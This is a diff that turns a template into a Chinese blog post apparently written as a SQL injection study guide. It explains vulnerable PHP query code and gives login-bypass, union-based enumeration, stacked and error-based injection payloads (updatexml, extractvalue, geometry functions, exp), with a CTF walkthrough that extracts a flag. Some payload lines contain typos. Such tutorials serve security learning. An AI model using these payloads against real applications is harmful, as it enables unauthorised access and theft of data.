@@ -1,37 +1,208 @@
-{% extends '_layout.swig' %}
-{% import '_macro/post.swig' as post_template %}
-{% import '_macro/sidebar.swig' as sidebar_template %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="utf-8">
+  
+  
+  
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+  <title>
+    sql注入总结（一） |
+    
+    Hexo</title>
+  
+    <link rel="shortcut icon" href="/favicon.ico">
+  
+  
+<link rel="stylesheet" href="/css/style.css">
 
+  
+<link rel="stylesheet" href="/css/technology.css">
 
-{% block title %}{{ page.title }} | {{ config.title }}{% endblock %}
+  
+    
+<link rel="stylesheet" href="/fancybox/jquery.fancybox.min.css">
 
-{% block page_class %}page-post-detail{% endblock %}
+  
+  
+<script src="/js/pace.min.js"></script>
 
+<meta name="generator" content="Hexo 5.1.1"></head>
 
-{% block content %}
+<body>
+  <div id="container">
+    <div id="wrap">
+      <section class="outer">
+  <article id="post-sql注入总结（一）" class="article article-type-post" itemscope itemprop="blogPost" data-scroll-reveal>
 
-  <div id="posts" class="posts-expand">
-    {{ post_template.render(page) }}
+  <div class="article-inner">
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      sql注入总结（一）
+    </h1>
+  
 
-    <div class="post-spread">
-      {% if theme.jiathis %}
-        {% include '_partials/share/jiathis.swig' %}
-      {% elseif theme.baidushare %}
-        {% include '_partials/share/baidushare.swig' %}
-      {% elseif theme.add_this_id %}
-        {% include '_partials/share/add-this.swig' %}
-      {% elseif theme.duoshuo_shortname and theme.duoshuo_share %}
-        {% include '_partials/share/duoshuo_share.swig' %}
-      {% endif %}
-    </div>
+      </header>
+    
+
+    
+      <div class="article-meta">
+        <a href="/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" class="article-date">
+  <time datetime="2020-08-28T02:34:54.000Z" itemprop="datePublished">2020-08-28</time>
+</a>
+        
+  <div class="article-category">
+    <a class="article-category-link" href="/categories/web/">web</a> / <a class="article-category-link" href="/categories/web/web%E5%AE%89%E5%85%A8/">web安全</a>
   </div>
 
-{% endblock %}
+      </div>
+    
 
-{% block sidebar %}
-  {{ sidebar_template.render(true) }}
-{% endblock %}
+    <div class="article-entry" itemprop="articleBody">
+      
 
-{% block script_extra %}
-  {% include '_scripts/pages/post-details.swig' %}
-{% endblock %}
+      
+
+      
+        <p>sql注入是个很复杂的东西，这里分多篇来总结一些常见的注入姿势。</p>
+<h2 id="0x00-注入原理"><a href="#0x00-注入原理" class="headerlink" title="0x00 注入原理"></a>0x00 注入原理</h2><p>sql注入，即通过在sql查询的过程中通过构造特殊输入，改变原有sql语句的结构，从而实现执行攻击者想要执行的sql语句。<br>例如，我们有如下代码：   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$id &#x3D; $_GET[&#39;id&#39;];</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM users WHERE id&#x3D;&quot; . $id;</span><br></pre></td></tr></table></figure>
+<p>如果我们构造<code>/?id=1%20or%201=1</code>那么此时query将会变成<code>&quot;SELECT * FROM users WHERE id=1 or 1=1&quot;</code>,此时where后面的语句永远为真，故sql语句成功执行，造成sql注入。 </p>
+<h2 id="0x01-注入类型"><a href="#0x01-注入类型" class="headerlink" title="0x01 注入类型"></a>0x01 注入类型</h2><h3 id="按变量类型分类"><a href="#按变量类型分类" class="headerlink" title="按变量类型分类"></a>按变量类型分类</h3><ul>
+<li>数字型</li>
+<li>字符型</li>
+</ul>
+<h3 id="按提交方式分类"><a href="#按提交方式分类" class="headerlink" title="按提交方式分类"></a>按提交方式分类</h3><ul>
+<li>GET型</li>
+<li>POST型</li>
+<li>COOKIE型</li>
+</ul>
+<h3 id="按注入方式分类"><a href="#按注入方式分类" class="headerlink" title="按注入方式分类"></a>按注入方式分类</h3><ul>
+<li>union联合查询注入</li>
+<li>报错注入</li>
+</ul>
+<ul>
+<li>盲注<ul>
+<li>基于时间的盲注</li>
+<li>基于布尔的盲注</li>
+</ul>
+</li>
+</ul>
+<h3 id="编码"><a href="#编码" class="headerlink" title="编码"></a>编码</h3><ul>
+<li>宽字节注入</li>
+</ul>
+<h2 id="0x02-万能密码"><a href="#0x02-万能密码" class="headerlink" title="0x02 万能密码"></a>0x02 万能密码</h2><p>万能密码是指，在一个登录接口中如果存在sql注入，可以通过构造where子句永远为真从而实现登录。例如：   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">$username &#x3D; $_GET[&#39;username&#39;];</span><br><span class="line">$password &#x3D; $_GET[&#39;password&#39;];</span><br><span class="line">$query &#x3D; &quot;SELECT * FROM users WHERE username&#x3D;&#39;&quot; . $id . &quot;&#39;and password&#x3D;&#39;&quot; . $password . &quot;&#39;&quot;;</span><br></pre></td></tr></table></figure>
+<p>首先我们知道<code>#</code>和<code>--</code>是sql语句中的注释，其中<code>--</code>后面需要加一个空格。这里我们巧妙构造输入<code>/?username=admin%27%20or%201=1%20%23</code>，这时sql语句变为<code>&quot;SELECT * FROM users WHERE username=&#39;admin&#39; or 1=1 #and password=&#39;&#39;&quot;</code>从而<code>and password=&#39;&#39;</code>这部分内容被注释掉了，sql语句永远为真，造成sql注入。   </p>
+<h2 id="0x03-联合查询注入"><a href="#0x03-联合查询注入" class="headerlink" title="0x03 联合查询注入"></a>0x03 联合查询注入</h2><p>联合查询注入是一种常用的注入方式，它借助的是大于等于5.0版本的MySQL中的<code>information_schema</code>数据库，<code>information_schema</code>数据库中存储了MySQL服务器所维护的其他所有数据库的信息。例如数据库名，数据表名，列名，列的数据类型等。这时通过<code>union</code>关键字进行联合查询即可查询到大量信息。   </p>
+<p>举个简单的题目的例子，2019极客大挑战的一道sql注入题。(复现环境<a target="_blank" rel="noopener" href="https://buuoj.cn/challenges">https://buuoj.cn/challenges</a>)<br>拿到题目，使用<code>1&#39;</code>登录，发现sql报错，故存在注入点。<br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）1.jpg"><br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）2.jpg"><br>这里首先尝试万能密码登录，<code>/check.php?username=admin%27%20%23&amp;password=123</code>，发现成功登录，显示了登录用户名和一串密码。<br><img src="/assets/img/sql注入总结（一）/sql注入总结（一）3.jpg"><br>将第一个查询字段的<code>admin</code>置为一个不存在的值[不这么做的话会无法显示union select查询出的值]，然后判断列数，发现共计3列，尝试第四列则报错。  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20order%20by%1,2,3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/sql注入总结（一）/sql注入总结（一）4.jpg">   
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20order%20by1,2,3,4%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/sql注入总结（一）/sql注入总结（一）5.jpg">   
+
+<p>判断一下列名对应的内容：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,2,3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/sql注入总结（一）/sql注入总结（一）6.jpg">   
+
+<p>发现第二列对应username，第三列对应password。<br>下面开始union select注入。首先查数据库名。数据库名对应的是<code>information_schema.schemata</code>数据表，这里面存储的是所有数据库的信息。    </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(schema_name)%20from%20information_schema.schemata),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/sql注入总结（一）/sql注入总结（一）7.jpg">    
+
+<p>下一步查询数据表，所有数据表名信息存储在<code>information_schema.tables</code>数据表中。例如查询geek数据库的数据表名：   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema&#x3D;&quot;geek&quot;),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/sql注入总结（一）/sql注入总结（一）8.jpg">   
+
+<p>下一步查询列名，所有列名信息存储在<code>information_schema.columns</code>数据表中。例如查询l0ve1ysq1表中的所有列名：  </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema&#x3D;&quot;geek&quot;%20and%20table_name&#x3D;&quot;l0ve1ysq1&quot;),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/sql注入总结（一）/sql注入总结（一）9.jpg">   
+最后通过limit限制行数一行一行查询表中的内容，最终得到flag。  
+
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;check.php?username&#x3D;admn%27%20union%20select%201,(select%20password%20from%20geek.l0ve1ysq1%20limit%2015,1),3%23&amp;password&#x3D;123</span><br></pre></td></tr></table></figure>
+<img src="/assets/img/sql注入总结（一）/sql注入总结（一）10.jpg">   
+
+<h2 id="0x04-堆叠注入"><a href="#0x04-堆叠注入" class="headerlink" title="0x04 堆叠注入"></a>0x04 堆叠注入</h2><p>堆叠注入指的是在某些情况下，后端的sql语句执行函数可以执行多条命令(例如mysqli_multi_query())，这个时候我们可以通过<code>;</code>来结束前一条sql语句，随后再在分号后面写入sql，从而实现“堆一堆”sql语句进行注入。而<code>;</code>后的语句理论上没有过滤的话则可以为所欲为。<br>不过堆叠注入利用的条件有限，因为一般情况下后台的sql执行函数为安全起见只允许执行单一sql，分号后的语句将会被忽略。  </p>
+<h2 id="0x05-报错注入"><a href="#0x05-报错注入" class="headerlink" title="0x05 报错注入"></a>0x05 报错注入</h2><p>报错注入一般应用在正确执行无回显，而若发生错误会显示错误的情况下。这时可以使用报错注入的方式获得数据库信息。<br>报错注入常用函数：   </p>
+<h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>函数原型：<code>UPDATEXML(XML_document, XPath_string, new_value);</code><br>第一个参数：<code>XML_document</code>，是String格式，是XML文档对象的名称<br>第二个参数：<code>XPath_string</code>，XPath格式的字符串<br>第三个参数：<code>new_value</code>，String格式，替换查找到符合条件的数据<br>函数作用：改变文档中符合条件的节点的值。<br>注：updatexml最多只能显示32位，需要配合substr等字符串处理函数使用。<br>例如：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and updatexml(1,concat(0x7e,(select @@version),0x7e),1)</span><br></pre></td></tr></table></figure>
+<h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><p>函数原型：<code>EXTRACTVALUE(XML_document, XPath_string)</code><br>参数含义同上。<br>举例:   </p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http:&#x2F;&#x2F;example.com&#x2F;index.php?id&#x3D;1 and (extractvalue(1,concat(0x7e,(select user()),0x7e)))</span><br></pre></td></tr></table></figure>
+<h4 id="几何对象"><a href="#几何对象" class="headerlink" title="几何对象"></a>几何对象</h4><p>MySQL中支持的几何数据类型包括Geometry,Point,LineString,Polygon以及集合类型的MultiPoint,MultiLineString,MultiPolygon,GeometryCollection.其中Geometry可以表示任意一种几何类型，即在MySQL中，如果一个字段类型是Geometry，则可以存储Point、LineString等其它几何类型的值。其他的几种则需要固定有效的表示格式。<br>我们可以借助几何对象的相关函数进行报错注入。<br>geometrycollection():<code>id=1 and geometrycollection((select * from(select * from(select user())a)b))</code><br>multipoint():<code>id=1 and multipoint((select * from(select * from(select user())a)b))</code><br>polygon():<code>id=1 and polygon((select * from(select * from(select user())a)b))</code><br>multipolygon():<code>id=1 and multipolygon((select * from(select * from(select user())a)b))</code><br>linestring():<code>id=1 and linestring((select * from(select * from(select user())a)b))</code><br>multilinestring():<code>id=1 and multilinestring((select * from(select * from(select user())a)b))</code>   </p>
+<h4 id="exp"><a href="#exp" class="headerlink" title="exp()"></a>exp()</h4><p>例子：<br><code>id=1 and exp(~(select * from(select user())a))</code>   </p>
+<p>OK,先总结这么多，剩下的内容下次再总结。</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://su29029.github.io/2020/08/28/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93%EF%BC%88%E4%B8%80%EF%BC%89/" data-id="ckedortm10012xity1le10i2d"
+         class="article-share-link">分享</a>
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web%E5%AE%89%E5%85%A8/" rel="tag">web安全</a></li></ul>
+
+    </footer>
+
+  </div>
+
+  
+    
+  <nav class="article-nav">
+    
+      <a href="/2020/08/28/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%B0%BE%E9%83%A8%E5%AD%97%E7%AC%A6%E4%B8%B2%E9%80%83%E9%80%B8%E5%AD%A6%E4%B9%A0/" class="article-nav-link">
+        <strong class="article-nav-caption">上一篇</strong>
+        <div class="article-nav-title">
+          
+            php反序列化尾部字符串逃逸学习
+          
+        </div>
+      </a>
+    
+    
+      <a href="/2020/08/28/20200315%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" class="article-nav-link">
+        <strong class="article-nav-caption">下一篇</strong>
+        <div class="article-nav-title">20200315学习总结</div>
+      </a>
+    
+  </nav>
+
+
+  
+
+  
+    
+  
+
+</article>
+
+
+
+</section>
+    </div>
+    
+<script src="/js/jquery-2.0.3.min.js"></script>
+
+
+<script src="/js/lazyload.min.js"></script>
+
+
+<script src="/js/busuanzi-2.3.pure.min.js"></script>
+
+
+
+  
+<script src="/fancybox/jquery.fancybox.min.js"></script>
+
+
+
+
+
+
+<script src="/js/technology.js"></script>
+
+
+  </div>
+</body>
+</html>
